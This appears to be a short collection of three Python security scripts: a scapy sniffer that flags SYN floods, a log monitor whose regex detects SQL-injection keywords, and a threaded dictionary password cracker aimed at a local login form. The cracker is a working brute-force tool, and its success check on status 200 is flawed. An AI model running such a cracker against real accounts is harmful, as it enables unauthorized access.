🔁 1. Real-Time Packet Sniffer with Suspicious SYN Flood Detection

from scapy.all import sniff, IP, TCP
from collections import defaultdict
from datetime import datetime

syn_counter = defaultdict(int)

def packet_callback(packet):
    if IP in packet and TCP in packet:
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        flags = packet[TCP].flags
        timestamp = datetime.now().strftime("%H:%M:%S")

        print(f"[{timestamp}] {ip_src} -> {ip_dst} | Flags: {flags}")

        # Detect SYN flood behavior
        if flags == "S":
            syn_counter[ip_src] += 1
            if syn_counter[ip_src] > 20:
                print(f"⚠️  Possible SYN flood from {ip_src}")

# Real-time TCP traffic sniffing
sniff(filter="tcp", prn=packet_callback, store=False)

📄 2. Real-Time Log File Anomaly Monitor

Monitors logs (e.g., Apache access.log) and prints anomalies as they appear.

import re
import time

log_file_path = "access.log"
suspicious_pattern = re.compile(r"(UNION|SELECT|DROP|--|OR\s+1=1)", re.IGNORECASE)

def monitor_log(file_path):
    with open(file_path, 'r') as file:
        file.seek(0, 2)  # Start at end of file
        while True:
            line = file.readline()
            if not line:
                time.sleep(0.1)
                continue

            if suspicious_pattern.search(line):
                print(f"⚠️  Suspicious activity: {line.strip()}")

            elif "404" in line or "500" in line:
                print(f"🔧 Error response logged: {line.strip()}")

monitor_log(log_file_path)

🔑 3. Real-Time Dictionary Password Cracker (Simulated Login)

Run this with a local test login form to simulate cracking.

import requests
from concurrent.futures import ThreadPoolExecutor

target_url = "http://localhost/login"
username = "admin"

def try_password(password):
    password = password.strip()
    response = requests.post(target_url, data={"username": username, "password": password})

    if "Welcome" in response.text or response.status_code == 200:
        print(f"✅ Success: Password is '{password}'")
        return True
    else:
        print(f"❌ Failed: {password}")

def crack_passwords(password_file):
    with open(password_file) as f:
        passwords = f.readlines()

    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(try_password, passwords)

crack_passwords("passwords.txt")

✅ How to Run Each Script

    packet_sniffer.py:

sudo python3 packet_sniffer.py

log_monitor.py:

python3 log_monitor.py

password_cracker.py:

python3 password_cracker.py
